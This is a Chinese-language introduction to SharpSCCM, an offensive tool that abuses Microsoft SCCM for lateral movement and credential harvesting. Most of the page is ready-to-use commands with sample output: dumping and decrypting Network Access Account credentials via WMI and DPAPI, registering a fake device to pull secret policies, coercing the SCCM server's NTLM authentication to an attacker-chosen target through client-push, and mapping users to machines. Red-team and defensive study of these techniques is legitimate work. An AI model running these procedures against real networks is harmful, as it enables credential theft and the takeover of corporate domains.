## 关于SharpSCCM

SharpSCCM是一款功能强大的横向渗透和凭证收集工具，该工具主要利用了微软终端配置管理器（SCCM）来实现其功能，并能够通过访问SCCM管理终端GUI来实现横向渗透和凭证收集。

## 功能介绍

> 1、后渗透功能，支持横向渗透；
>
> 2、支持从SCCM客户端请求NTLM认证；
>
> 3、支持收集网络访问账号（NAA）的凭证信息；
>
> 4、请求和反混淆NAA凭证；
>
> 5、支持滥用新发现的攻击原语来强制来自SCCM服务器的NTLM身份验证；

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/Mayyhem/SharpSCCM.git

## 项目构建

将项目源码克隆至本地之后，在Visual Studio中打开SharpSCCM.sln，然后选择目标，比如说Release > x64。

接下来，构建解决方案（Ctrl + Shift + B）即可。

此时，将在目标路径下生成一个SharpSCCM程序集，其中包含了所有的工具及依赖组件，路径为.\SharpSCCM\bin\x64\Release\SharpSCCM_merged.exe。

## 命令行使用

命令样例：

    
    
    SharpSCCM.exe [command] [options]

自命令样例：

    
    
    add     支持将对象添加到其他对象
    
      get     查询指定对象，并显示对象内容
    
      exec    从指定UNC路径执行一个应用程序，或从客户端设备请求NTLM身份认证
    
      invoke  在服务器上执行或调用操作
    
      local    与本地工作站/服务器交互
    
      new     在服务器上创建新的对象
    
      remove  从服务器删除对象

## 工具使用

### 从本地SCCM客户端设备导出和解密NAA凭证

通过WMI导出NAA并使用DPAPI主密钥进行解密：

    
    
    SharpSCCM.exe local naa wmi

样例输出：

    
    
    .\SharpSCCM.exe local naa wmi
    
     
    
      _______ _     _ _______  ______  _____  _______ _______ _______ _______
    
      |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
    
      ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |
    
     
    
    [*] Retrieving Network Access Account blobs via WMI
    
     
    
    [+]     Connecting to \\localhost\root\ccm\policy\Machine\ActualConfig
    
    [+]     Executing WQL query: SELECT * FROM CCM_NetworkAccessAccount
    
     
    
    [*] Elevating to SYSTEM via token duplication for LSA secret retrieval
    
    [*] RevertToSelf()
    
     
    
    [*] Secret  : DPAPI_SYSTEM
    
    [*]    full: <REDACTED>
    
    [*]    m/u : <REDACTED>
    
     
    
    [*] SYSTEM master key cache:
    
     
    
    {340f2212-5765-4e57-8931-070fadb401c2}:<REDACTED>
    
    {3c58124e-ef4e-4841-900c-3183550720b3}:<REDACTED>
    
    {226f00ce-7ab9-4fff-a7e0-665e7afb2785}:<REDACTED>
    
    {6641ae28-12b2-4e79-abe4-2199ac0245b1}:<REDACTED>
    
     
    
     
    
    [*] Triaging Network Access Account Credentials
    
     
    
         Plaintext NAA Username         : APERTURE\networkaccess
    
         Plaintext NAA Password         : <REDACTED>

### 请求设备策略并获取NAA凭证

    
    
    SharpSCCM.exe get naa -u <computer$> -p <password>

样例输出：

    
    
    .\SharpSCCM.exe get naa -u chell$ -p <password>
    
     
    
      _______ _     _ _______  ______  _____  _______ _______ _______ _______
    
      |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
    
      ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |
    
     
    
    [+] Connecting to \\localhost\root\ccm
    
    [+] Executing WQL query: SELECT Name,CurrentManagementPoint FROM SMS_Authority
    
    [+] Current management point: atlas.aperture.sci
    
    [+] Site code: PS1
    
    [+] Created "ConfigMgr Client Messaging" certificate in memory for device registration and signing/encrypting subsequent messages
    
    [+] Wrote "ConfigMgr Client Messaging" certificate to My store for CurrentUser
    
    [+] Discovering local properties for client registration request
    
    [+] Modifying client registration request properties:
    
          FQDN: CAVE-JOHNSON-PC.APERTURE
    
          NetBIOS name: CAVE-JOHNSON-PC
    
          Authenticating as: chell$
    
          Site code: PS1
    
    [+] Sending HTTP registration request to atlas.aperture.sci:80
    
    [+] Received unique GUID for new device: GUID:A7FC423E-FF62-48B1-8A42-9447178D16C5
    
    [+] Obtaining Full Machine policy assignment from atlas.aperture.sci PS1
    
    [+] Found 43 policy assignments
    
    [+] Found policy containing secrets:
    
          ID: {096db290-7e52-41cb-839c-b8af87b82abf}
    
          Flags: RequiresAuth, Secret, IntranetOnly, PersistWholePolicy
    
          URL: http://<mp>/SMS_MP/.sms_pol?{096db290-7e52-41cb-839c-b8af87b82abf}.4_00
    
    [+] Adding authentication headers to download request:
    
          ClientToken: GUID:A7FC423E-FF62-48B1-8A42-9447178D16C5;2022-10-17T23:24:00Z;2
    
          ClientTokenSignature: 9BAF8C2981B17DE0E056C42E8E4605B72A0559CE30C245E06CADC65A25A37D342595B6DCC542ABB9C20A01E9D1E71B1E8B52E8CF6B9C6214C76CA1C636B301031E15E8A53D1A2E52E18416F6A77F1BD8D793184995D93423E1F346E6B131CE07908DC26FB20CCF09F1B1FC2318104C7145B69D6870819CB9B35C8F87C3CB311211F84BA812EC15AAD7C3E512BF73D67A5AA7EA180E07E35E712CC69DF034183BA89C5937AC3EF954E5B3D8401172B6C0850695436180FD3A4185F4702F2647AE1E747BD5D64707123F003958CF110E7191CE5D299F97CCE4D01965F92496C748DD0F0A20CDB3F469C8BB5A33340142CD91B8F1C7D3082EC6B86080072783390A
    
    [+] Received encoded response from server for policy {096db290-7e52-41cb-839c-b8af87b82abf}
    
    [+] Successfully decoded and decrypted secret policy
    
    [+] Deleted "CN=ConfigMgr Client Messaging" certificate from My store for CurrentUser
    
    [+] Encrypted NAA username: 89130000...<REDACTED>...6C006F00
    
    [+] Encrypted NAA password: 89130000...<REDACTED>...8D3C0000
    
    [+] Done! Encrypted NAA hex strings can be decrypted offline using the "DeobfuscateNAAString.exe <string>" command
    
     
    
    ..\..\..\DeobfuscateNAAString\Release\DeobfuscateNAAString.exe 89130000...<REDACTED>...06C006F00
    
    Plaintext: APERTURE\networkaccess
    
     
    
    ..\..\..\DeobfuscateNAAString\Release\DeobfuscateNAAString.exe 89130000...<REDACTED>...8D3C0000
    
    Plaintext: <REDACTED>

### 横向渗透：调用client-push

强制SCCM服务器通过SMB向目标<target>发送NTLM身份认证：

    
    
    SharpSCCM.exe <server> <sitecode> invoke client-push -t <target>

强制SCCM服务器通过HTTP向目标<target>发送NTLM身份认证：

    
    
    SharpSCCM.exe <server> <sitecode> invoke client-push -t <target@port>

样例输出：

    
    
    PS C:\Users\cave.johnson.APERTURE\SharpSCCM\bin\x64\Release> .\SharpSCCM.exe atlas ps1 invoke client-push -t 192.168.57.130
    
    [+] Discovering local properties for client registration request
    
    [+] Modifying client registration request properties
    
      ClientFqdn: 192.168.57.130
    
      NetBiosName: 192.168.57.130
    
      SiteCode: ps1
    
     
    
    [+] Registration Request Body:
    
    <...snip...>
    
    [+] Sending HTTP registration request to atlas:80
    
    [+] Received unique GUID for new device: GUID:19B65F3B-AAD8-41C1-B4BE-E6917FA0B8BE
    
    [+] Discovering local properties for DDR inventory report
    
    [+] Modifying DDR and inventory report properties
    
    [+] Discovered PlatformID: Microsoft Windows NT Server 10.0
    
    [+] Modified PlatformID: Microsoft Windows NT Workstation 2010.0
    
    [+] DDR Body:
    
    <...snip...>
    
    [+] Inventory Report Body:
    
    <...snip...>
    
    [+] Sending DDR from GUID:19B65F3B-AAD8-41C1-B4BE-E6917FA0B8BE to MP_DdrEndpoint endpoint on atlas:ps1 and requesting client installation on 192.168.57.130

### 横向渗透：获取primary-user

使用<username>主用户获取设备列表：

    
    
    SharpSCCM.exe <server> <sitecode> get primary-user -u <username>

样例输出：

    
    
    .\SharpSCCM.exe atlas ps1 get primary-user -u chell
    
    [+] Connecting to \\atlas\root\SMS\site_ps1
    
    [+] Executing WQL query: SELECT * FROM SMS_UserMachineRelationship WHERE UniqueUserName LIKE '%chell%'
    
    -----------------------------------    
    SMS_UserMachineRelationship
    
    -----------------------------------    
    CreationTime: 20220528005101.523000+000
    
    IsActive: True
    
    RelationshipResourceID: 25165825
    
    ResourceClientType: 1
    
    ResourceID: 16777227
    
    ResourceName: GLADOS
    
    Sources: 2
    
    Types: 1
    
    UniqueUserName: aperture\chell
    
    -----------------------------------
## 许可证协议

本项目的开发与发布遵循GPL-3.0开源许可证协议。

## 项目地址

 **SharpSCCM** ：【[ _GitHub传送门_](https://github.com/Mayyhem/SharpSCCM)】

## 参考资料

> [ _https://enigma0x3.net/2016/02/29/offensive-operations-with-> powersccm/_](https://enigma0x3.net/2016/02/29/offensive-operations-with-> powersccm/)
>
> [ _https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-> clients-7dccb8f92867_](https://posts.specterops.io/relaying-ntlm-> authentication-from-sccm-clients-7dccb8f92867)
>
> [ _https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-> wont-die-332ac7aa1ab9_](https://posts.specterops.io/the-phantom-credentials-> of-sccm-why-the-naa-wont-die-332ac7aa1ab9)
>
> [ _https://blog.xpnsec.com/unobfuscating-network-access-> accounts/_](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)
>
> [ _https://posts.specterops.io/coercing-ntlm-authentication-from-> sccm-e6e23ea8260a_](https://posts.specterops.io/coercing-ntlm-> authentication-from-sccm-e6e23ea8260a)
>
> [ _https://docs.microsoft.com/en-> us/mem/configmgr/core/clients/deploy/plan/security-and-privacy-for-> clients_](https://docs.microsoft.com/en-> us/mem/configmgr/core/clients/deploy/plan/security-and-privacy-for-clients)

